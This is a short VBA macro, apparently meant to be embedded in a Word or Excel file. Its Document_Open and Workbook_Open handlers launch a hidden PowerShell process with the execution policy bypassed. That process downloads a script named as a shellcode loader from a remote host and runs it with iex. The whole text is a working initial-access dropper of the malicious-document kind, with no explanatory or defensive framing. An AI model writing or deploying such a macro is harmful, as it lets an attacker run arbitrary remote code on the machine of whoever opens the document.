Private Sub Main()
	Set o = CreateObject("WScript.Shell")
	strArg = "cmd.exe /c powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.1:80/scripts/shellcode-loaders/runner.ps1'))"
        o.Run strArg, 0
End Sub

Sub Workbook_Open()
	Main()
End Sub

Sub Document_Open()
	Main()
End Sub

